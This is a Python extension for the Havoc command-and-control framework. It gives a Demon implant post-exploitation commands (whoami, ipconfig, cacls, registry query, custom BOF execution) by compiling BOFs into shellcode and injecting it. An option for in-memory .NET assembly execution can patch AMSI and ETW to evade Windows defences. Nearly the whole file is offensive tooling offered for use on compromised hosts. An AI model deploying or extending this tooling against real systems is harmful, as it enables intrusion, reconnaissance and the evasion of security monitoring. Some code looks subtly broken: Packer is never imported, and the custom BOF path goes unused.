#!/usr/bin/env python
# Author: pard0p
# Remote BOF Runner - Execute BOFs via shellcode injection
# All commands are subcommands of remote-bof-runner

from havoc import Demon, RegisterCommand, RegisterModule
import havoc

import os
from base64 import b64decode, b64encode
from time import sleep
import sys
import inspect
import subprocess
import shutil
import uuid

# Global variable to cache extension root
_extension_root = None

# Extension root directory - get it dynamically
def get_extension_root():
	"""Get the extension root directory"""
	global _extension_root
	
	# Return cached value if available
	if _extension_root and os.path.exists(_extension_root):
		return _extension_root
	
	# Use working directory + data path
	_extension_root = os.getcwd() + "/data/extensions/Remote-BOF-Runner" # Adjust as needed
	
	if os.path.exists(_extension_root):
		return _extension_root
	
	# Fallback: Try to detect from stack
	for frame_info in inspect.stack():
		if 'remote-bof-runner.py' in frame_info.filename:
			_extension_root = os.path.dirname(os.path.abspath(frame_info.filename))
			if os.path.exists(_extension_root):
				return _extension_root
	
	# Last resort
	return os.getcwd()

def generate_shellcodes():
	"""Auto-generate shellcode binaries on first module load"""
	try:
		extension_root = get_extension_root()
		
		# Verify extension root exists
		if not os.path.exists(extension_root):
			print(f"[!] Extension root not found: {extension_root}")
			return
		
		# Define shellcodes to generate for x64 architecture
		shellcodes = [
			{
				'name': 'whoami.x64.bin',
				'output_path': os.path.join(extension_root, 'Bin', 'whoami.x64.bin'),
				'command': './Source/PIC-Loader/CP-Dist/link ./Source/PIC-Loader/loader.spec ./Source/Modules/whoami.x64.o ./Bin/whoami.x64.bin',
				'work_dir': extension_root
			},
			{
				'name': 'ipconfig.x64.bin',
				'output_path': os.path.join(extension_root, 'Bin', 'ipconfig.x64.bin'),
				'command': './Source/PIC-Loader/CP-Dist/link ./Source/PIC-Loader/loader.spec ./Source/Modules/ipconfig.x64.o ./Bin/ipconfig.x64.bin',
				'work_dir': extension_root
			}
		]
		
		for shellcode in shellcodes:
			# Check if shellcode already exists
			if os.path.exists(shellcode['output_path']):
				print(f"[*] {shellcode['name']} already exists")
				continue
			
			# Verify work directory exists
			if not os.path.exists(shellcode['work_dir']):
				print(f"[!] Work directory not found: {shellcode['work_dir']}")
				continue
			
			print(f"[*] Generating {shellcode['name']}...")
			
			try:
				# Execute the command to generate shellcode
				# Use bash explicitly to ensure proper environment
				result = subprocess.run(
					['bash', '-c', shellcode['command']],
					cwd=shellcode['work_dir'],
					capture_output=True,
					text=True,
					timeout=30,
					env=os.environ.copy()
				)
				
				if result.returncode == 0:
					print(f"[+] Successfully generated {shellcode['name']}")
				else:
					print(f"[!] Error generating {shellcode['name']}: {result.stderr}")
			except subprocess.TimeoutExpired:
				print(f"[!] Timeout generating {shellcode['name']}")
			except Exception as e:
				print(f"[!] Exception while generating {shellcode['name']}: {str(e)}")
	except Exception as e:
		print(f"[!] Error in generate_shellcodes(): {str(e)}")

def generate_shellcode_on_demand(extension_root, temp_dir, shellcode_name, module_name, bof_args_path=None):
	"""Generate a specific shellcode on demand in a temporary directory"""
	shellcode_path = os.path.join(temp_dir, shellcode_name)
	
	# Build the command with optional BOF arguments
	command = f'./Source/PIC-Loader/CP-Dist/link ./Source/PIC-Loader/loader.spec ./Source/Modules/{module_name}.x64.o {shellcode_path}'
	
	# Add BOF arguments if provided
	if bof_args_path:
		command += f' -r %BOF_ARGS="{bof_args_path}"'
	
	try:
		result = subprocess.run(
			['bash', '-c', command],
			cwd=extension_root,
			capture_output=True,
			text=True,
			timeout=30,
			env=os.environ.copy()
		)
		
		if result.returncode == 0 and os.path.exists(shellcode_path):
			return shellcode_path
		else:
			return None
	except Exception as e:
		return None

def run(demonID, *params):
	TaskID : str = None
	demon : Demon = None
	demon = Demon(demonID)
	
	num_params = len(params)
	
	if num_params < 1 or params[0] == 'help' or params[0] == '-h':
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE: remote-bof-runner <command> [args]")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "Commands: whoami, ipconfig, cacls, reg_query, inline-execute-assembly, bof")
		return False
	
	command = params[0]
	
	# Dispatch to appropriate function
	if command == 'whoami':
		return whoami(demonID)
	elif command == 'ipconfig':
		return ipconfig(demonID)
	elif command == 'cacls':
		return cacls(demonID, *params[1:])
	elif command == 'reg_query':
		return reg_query(demonID, *params[1:])
	# elif command == 'inline-execute-assembly':
	# 	return inline_execute_assembly(demonID, *params[1:])
	elif command == 'bof':
		return execute_custom_bof(demonID, *params[1:])
	else:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Unknown command: {command}")
		return False

def cleanup_temp_directory(temp_dir, demon=None):
	"""Safely cleanup temporary directory"""
	if not temp_dir or not os.path.exists(temp_dir):
		return True
	
	try:
		shutil.rmtree(temp_dir)
		return True
	except Exception as e:
		if demon:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Warning: Failed to clean up temp directory {temp_dir}: {str(e)}")
		return False

def execute_bof(demonID, shellcode_bytes, task_msg, temp_dir=None):
	"""Common function to execute a BOF with shellcode"""
	demon = Demon(demonID)
	
	try:
		if not shellcode_bytes:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Shellcode is empty")
			return False
		
		extension_root = get_extension_root()
		bof_path = os.path.join(extension_root, "Source", "BOF-Injector", "Bin", "injector.x64.o")
		
		if not os.path.exists(bof_path):
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] BOF object file not found: {bof_path}")
			return False
		
		# Pack the shellcode with length
		packer = Packer()
		packer.addint(len(shellcode_bytes))
		packer.addbytes(shellcode_bytes)
		
		TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, task_msg)
		demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)
		
		return TaskID
	finally:
		# Always clean up temporary directory
		cleanup_temp_directory(temp_dir, demon)

def read_shellcode(demon, shellcode_path):
	"""Read a shellcode from file"""
	if not os.path.exists(shellcode_path):
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Shellcode file not found: {shellcode_path}")
		return None
	
	try:
		with open(shellcode_path, 'rb') as f:
			shellcode_bytes = f.read()
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error reading shellcode: {str(e)}")
		return None
	
	if len(shellcode_bytes) == 0:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Shellcode is empty")
		return None
	
	return shellcode_bytes

# ============================================================================
# WHOAMI - Show current user and group information
# ============================================================================

def whoami(demonID, *params):
	demon = Demon(demonID)
	extension_root = get_extension_root()
	
	# Create temporary directory for this task
	temp_id = str(uuid.uuid4())[:8]
	temp_dir = os.path.join(extension_root, "Temp", temp_id)
	
	try:
		try:
			os.makedirs(temp_dir, exist_ok=True)
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating temp directory: {str(e)}")
			return False
		
		# Create empty BOF arguments file
		bof_args_path = os.path.join(temp_dir, "bof_args.o")
		try:
			with open(bof_args_path, 'wb') as f:
				pass  # Create empty file
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating BOF args file: {str(e)}")
			return False
		
		# Generate shellcode on demand with BOF args
		shellcode_file = generate_shellcode_on_demand(extension_root, temp_dir, "whoami.x64.bin", "whoami", bof_args_path)
		if not shellcode_file:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Failed to generate whoami shellcode")
			return False
		
		# Read the generated shellcode
		shellcode_bytes = read_shellcode(demon, shellcode_file)
		if not shellcode_bytes:
			return False
		
		return execute_bof(demonID, shellcode_bytes, "[+] Executing whoami", temp_dir)
	finally:
		# Always clean up temporary directory
		cleanup_temp_directory(temp_dir, demon)

# ============================================================================
# IPCONFIG - Show network adapter configuration
# ============================================================================

def ipconfig(demonID, *params):
	demon = Demon(demonID)
	extension_root = get_extension_root()
	
	# Create temporary directory for this task
	temp_id = str(uuid.uuid4())[:8]
	temp_dir = os.path.join(extension_root, "Temp", temp_id)
	
	try:
		try:
			os.makedirs(temp_dir, exist_ok=True)
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating temp directory: {str(e)}")
			return False
		
		# Create empty BOF arguments file
		bof_args_path = os.path.join(temp_dir, "bof_args.o")
		try:
			with open(bof_args_path, 'wb') as f:
				pass  # Create empty file
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating BOF args file: {str(e)}")
			return False
		
		# Generate shellcode on demand with BOF args
		shellcode_file = generate_shellcode_on_demand(extension_root, temp_dir, "ipconfig.x64.bin", "ipconfig", bof_args_path)
		if not shellcode_file:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Failed to generate ipconfig shellcode")
			return False
		
		# Read the generated shellcode
		shellcode_bytes = read_shellcode(demon, shellcode_file)
		if not shellcode_bytes:
			return False
		
		return execute_bof(demonID, shellcode_bytes, "[+] Executing ipconfig", temp_dir)
	finally:
		# Always clean up temporary directory
		cleanup_temp_directory(temp_dir, demon)

# ============================================================================
# CACLS - List file permissions
# ============================================================================

def cacls(demonID, *params):
	demon = Demon(demonID)
	
	# Validate arguments
	if len(params) < 1:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] requires file path")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE: remote-bof-runner cacls <file path>")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "Wildcards are supported")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "EXAMPLES:")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  remote-bof-runner cacls C:\\windows\\system32\\*")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  remote-bof-runner cacls C:\\windows\\system32\\cmd.exe")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "Key:")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  F: Full access")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  R: Read & Execute access")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  C: Read, Write, Execute, Delete")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  W: Write access")
		return False
	
	extension_root = get_extension_root()
	
	# Create temporary directory for this task
	temp_id = str(uuid.uuid4())[:8]
	temp_dir = os.path.join(extension_root, "Temp", temp_id)
	
	try:
		try:
			os.makedirs(temp_dir, exist_ok=True)
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating temp directory: {str(e)}")
			return False
		
		# Create BOF arguments file with file path
		bof_args_path = os.path.join(temp_dir, "bof_args.o")
		file_path = params[0]
		
		try:
			packer = Packer()
			packer.addWstr(file_path)
			
			with open(bof_args_path, 'wb') as f:
				f.write(packer.getbuffer())
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating BOF args file: {str(e)}")
			return False
		
		# Generate shellcode on demand with BOF args
		shellcode_file = generate_shellcode_on_demand(extension_root, temp_dir, "cacls.x64.bin", "cacls", bof_args_path)
		if not shellcode_file:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Failed to generate cacls shellcode")
			return False
		
		# Read the generated shellcode
		shellcode_bytes = read_shellcode(demon, shellcode_file)
		if not shellcode_bytes:
			return False
		
		return execute_bof(demonID, shellcode_bytes, f"[+] Executing cacls on {file_path}", temp_dir)
	finally:
		# Always clean up temporary directory
		cleanup_temp_directory(temp_dir, demon)

# ============================================================================
# REG_QUERY - Query Windows Registry
# ============================================================================

def reg_query(demonID, *params):
	demon = Demon(demonID)
	
	# Registry hive mapping
	reghives = {
		'HKCR': 0,
		'HKCU': 1,
		'HKLM': 2,
		'HKU': 3
	}
	
	# Validate parameters
	num_params = len(params)
	if num_params < 2:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Missing parameters")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE: remote-bof-runner reg_query [opt:hostname] <hive> <path> [opt:value]")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "HIVES: HKCR, HKCU, HKLM, HKU")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "EXAMPLES:")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  remote-bof-runner reg_query HKLM SYSTEM\\CurrentControlSet\\Control\\Lsa")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  remote-bof-runner reg_query HKLM SYSTEM\\CurrentControlSet\\Control\\Lsa RunAsPPL")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "  remote-bof-runner reg_query DC01 HKLM SYSTEM\\CurrentControlSet\\Control\\Lsa")
		return False
	
	if num_params > 4:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Too many parameters")
		return False
	
	# Parse parameters - check if first param is a hostname or hive
	params_parsed = 0
	hostname = None
	
	if params[params_parsed].upper() not in reghives:
		# First parameter is hostname
		hostname = params[params_parsed]
		params_parsed += 1
	
	# Next parameter must be a valid hive
	if params_parsed >= num_params:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Missing hive parameter")
		return False
	
	if params[params_parsed].upper() not in reghives:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Invalid registry hive: {params[params_parsed]}")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "Valid hives: HKCR, HKCU, HKLM, HKU")
		return False
	
	hive = reghives[params[params_parsed].upper()]
	params_parsed += 1
	
	# Path is required
	if params_parsed >= num_params:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Missing registry path")
		return False
	
	path = params[params_parsed]
	params_parsed += 1
	
	# Value is optional
	key = None
	if params_parsed < num_params:
		key = params[params_parsed]
	
	extension_root = get_extension_root()
	
	# Create temporary directory
	temp_id = str(uuid.uuid4())[:8]
	temp_dir = os.path.join(extension_root, "Temp", temp_id)
	
	try:
		try:
			os.makedirs(temp_dir, exist_ok=True)
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating temp directory: {str(e)}")
			return False
		
		# Create BOF arguments file
		bof_args_path = os.path.join(temp_dir, "bof_args.o")
		
		try:
			packer = Packer()
			packer.addstr(hostname if hostname else "")
			packer.adduint32(hive)
			packer.addstr(path)
			packer.addstr(key if key else "")
			packer.addbool(False)  # recursive
			
			with open(bof_args_path, 'wb') as f:
				f.write(packer.getbuffer())
		except Exception as e:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating BOF args file: {str(e)}")
			return False
		
		# Generate shellcode on demand with BOF args
		shellcode_file = generate_shellcode_on_demand(extension_root, temp_dir, "reg_query.x64.bin", "reg_query", bof_args_path)
		if not shellcode_file:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Failed to generate reg_query shellcode")
			return False
		
		# Read the generated shellcode
		shellcode_bytes = read_shellcode(demon, shellcode_file)
		if not shellcode_bytes:
			return False
		
		task_msg = "[+] Executing reg_query"
		if hostname:
			task_msg += f" on {hostname}"
		task_msg += f" - {path}"
		if key:
			task_msg += f" ({key})"
		
		return execute_bof(demonID, shellcode_bytes, task_msg, temp_dir)
	finally:
		# Always clean up temporary directory
		cleanup_temp_directory(temp_dir, demon)

# ============================================================================
# INLINE_EXECUTE_ASSEMBLY - Load CLR and inject .NET assembly
# ============================================================================

def inline_execute_assembly(demonID, *params):
	"""Load CLR if not already loaded and inject .NET assembly into beacon process"""
	demon = Demon(demonID)
	extension_root = get_extension_root()
	
	# Default values - matching CNA defaults
	amsi = False
	etw = False
	mailslot = False
	entry_point = 1  # 1 = default entry point, 0 = Main
	app_domain = "totesLegit"
	pipe_name = "totesLegit"
	mailslot_name = "totesLegit"
	dotnet_assembly = None
	assembly_args = []
	
	# Parse command-line arguments
	try:
		i = 0
		while i < len(params):
			arg = params[i]
			
			if arg == "--amsi":
				amsi = True
				i += 1
			elif arg == "--etw":
				etw = True
				i += 1
			elif arg == "--main":
				entry_point = 0
				i += 1
			elif arg == "--dotnetassembly":
				i += 1
				if i >= len(params):
					demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] --dotnetassembly requires a file path")
					return False
				dotnet_assembly = params[i]
				i += 1
			elif arg == "--assemblyargs":
				i += 1
				# Collect remaining args until next option flag
				while i < len(params) and not params[i].startswith("--"):
					assembly_args.append(params[i])
					i += 1
			elif arg == "--appdomain":
				i += 1
				if i >= len(params):
					demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] --appdomain requires a value")
					return False
				app_domain = params[i]
				i += 1
			elif arg == "--pipe":
				i += 1
				if i >= len(params):
					demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] --pipe requires a value")
					return False
				pipe_name = params[i]
				i += 1
			elif arg == "--mailslot":
				mailslot = True
				i += 1
				if i >= len(params):
					demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] --mailslot requires a name")
					return False
				mailslot_name = params[i]
				i += 1
			else:
				demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Unknown option: {arg}")
				return False
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error parsing arguments: {str(e)}")
		return False
	
	# Validate required parameters
	if not dotnet_assembly:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] --dotnetassembly is required")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "Usage: inline-execute-assembly --dotnetassembly <path> [--amsi] [--etw] [--assemblyargs <args>] [--appdomain <name>] [--pipe <name>] [--mailslot <name>] [--main]")
		return False
	
	# Check if assembly file exists
	if not os.path.isfile(dotnet_assembly):
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Assembly file not found: {dotnet_assembly}")
		return False
	
	# Read the .NET assembly file into bytes
	try:
		with open(dotnet_assembly, 'rb') as f:
			assembly_bytes = f.read()
		assembly_length = len(assembly_bytes)
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error reading assembly file: {str(e)}")
		return False
	
	if assembly_length == 0:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Assembly file is empty")
		return False
	
	# Join assembly arguments with spaces
	assembly_args_str = " ".join(assembly_args) if assembly_args else ""
	
	# Create temporary directory for BOF args
	temp_dir = os.path.join(extension_root, "Temp", str(uuid.uuid4()))
	try:
		os.makedirs(temp_dir, exist_ok=True)
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating temp directory: {str(e)}")
		return False
	
	# Create BOF arguments file with packing format matching CNA:
	# "ziiiizzzib" = string, int, int, int, int, string, string, string, int, bytes
	# app_domain, amsi, etw, mailslot, entry_point, mailslot_name, pipe_name, assembly_args, assembly_length, assembly_bytes
	bof_args_path = os.path.join(temp_dir, "bof_args.o")
	
	try:
		packer = Packer()
		packer.addstr(app_domain)       # z - app domain name
		packer.addint(1 if amsi else 0) # i - amsi flag
		packer.addint(1 if etw else 0)  # i - etw flag
		packer.addint(1 if mailslot else 0)  # i - mailslot flag
		packer.addint(entry_point)      # i - entry point (0=Main, 1=default)
		packer.addstr(mailslot_name)    # z - mailslot name
		packer.addstr(pipe_name)        # z - pipe name
		packer.addstr(assembly_args_str)# z - assembly arguments
		packer.addint(assembly_length)  # i - assembly length
		packer.addbytes(assembly_bytes) # b - assembly bytes
		
		with open(bof_args_path, 'wb') as f:
			f.write(packer.getbuffer())
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error creating BOF args file: {str(e)}")
		shutil.rmtree(temp_dir)
		return False
	
	# Generate shellcode on demand with BOF args
	shellcode_file = generate_shellcode_on_demand(extension_root, temp_dir, "inline-execute-assembly.x64.bin", "inline-execute-assembly", bof_args_path)
	if not shellcode_file:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Failed to generate inline-execute-assembly shellcode")
		shutil.rmtree(temp_dir)
		return False
	
	# Read the generated shellcode
	shellcode_bytes = read_shellcode(demon, shellcode_file)
	if not shellcode_bytes:
		shutil.rmtree(temp_dir)
		return False
	
	# Build task message
	task_msg = f"[+] Executing .NET assembly: {os.path.basename(dotnet_assembly)}"
	if assembly_args_str:
		task_msg += f" with args: {assembly_args_str}"
	if amsi:
		task_msg += " [AMSI patched]"
	if etw:
		task_msg += " [ETW patched]"
	
	return execute_bof(demonID, shellcode_bytes, task_msg, temp_dir)

# ============================================================================
# EXECUTE_CUSTOM_BOF - Execute custom BOF from shellcode file
# ============================================================================

def execute_custom_bof(demonID, *params):
	"""Execute a custom BOF from a shellcode file"""
	demon = Demon(demonID)
	
	num_params = len(params)
	
	if num_params < 1:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Shellcode path required")
		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE: remote-bof-runner bof <path_to_shellcode> [path_to_bof]")
		return False
	
	shellcode_path = params[0]
	
	# Check if shellcode file exists
	if not os.path.exists(shellcode_path):
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Shellcode file not found: {shellcode_path}")
		return False
	
	# Read shellcode
	try:
		with open(shellcode_path, 'rb') as f:
			shellcode_bytes = f.read()
	except Exception as e:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Error reading shellcode: {str(e)}")
		return False
	
	if len(shellcode_bytes) == 0:
		demon.ConsoleWrite(demon.CONSOLE_ERROR, "[-] Shellcode is empty")
		return False
	
	# Get the BOF object file path
	if num_params >= 2:
		# User provided custom BOF path
		bof_path = params[1]
	else:
		# Try to find the BOF in common locations
		extension_root = get_extension_root()
		possible_paths = [
			os.path.join(extension_root, "Bin", "remote-bof-runner.x64.bin"),
			os.path.join(os.path.dirname(shellcode_path), "remote-bof-runner.x64.bin"),
		]
		
		bof_path = None
		for path in possible_paths:
			if os.path.exists(path):
				bof_path = path
				break
		
		if not bof_path:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] BOF object file not found in any common location")
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] Searched paths:")
			for path in possible_paths:
				demon.ConsoleWrite(demon.CONSOLE_ERROR, f"    - {path}")
			demon.ConsoleWrite(demon.CONSOLE_INFO, "[*] Specify custom BOF path: remote-bof-runner bof <shellcode> <bof_path>")
			return False
	
	if not os.path.exists(bof_path):
		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] BOF object file not found: {bof_path}")
		return False
	
	# Pack the shellcode with length
	packer = Packer()
	packer.addint(len(shellcode_bytes))
	packer.addbytes(shellcode_bytes)
	
	TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"[+] Executing BOF with shellcode from {shellcode_path}")
	demon.InlineExecute(TaskID, "go", "", packer.getbuffer(), False)
	
	return TaskID

# ============================================================================
# Module and Command Registration
# ============================================================================

RegisterModule("remote-bof-runner", "Remote BOF Runner", "", "", "", "")
RegisterCommand(whoami, "remote-bof-runner", "whoami", "Show current user and group information", 0, "", "")
RegisterCommand(ipconfig, "remote-bof-runner", "ipconfig", "Show network adapter configuration", 0, "", "")
RegisterCommand(cacls, "remote-bof-runner", "cacls", "List file permissions", 0, "", "")
RegisterCommand(reg_query, "remote-bof-runner", "reg-query", "Query Windows Registry", 0, "", "")
RegisterCommand(inline_execute_assembly, "remote-bof-runner", "execute-assembly", "Load CLR and inject .NET assembly", 0, "", "")
RegisterCommand(execute_custom_bof, "remote-bof-runner", "bof", "Execute custom BOF", 0, "", "")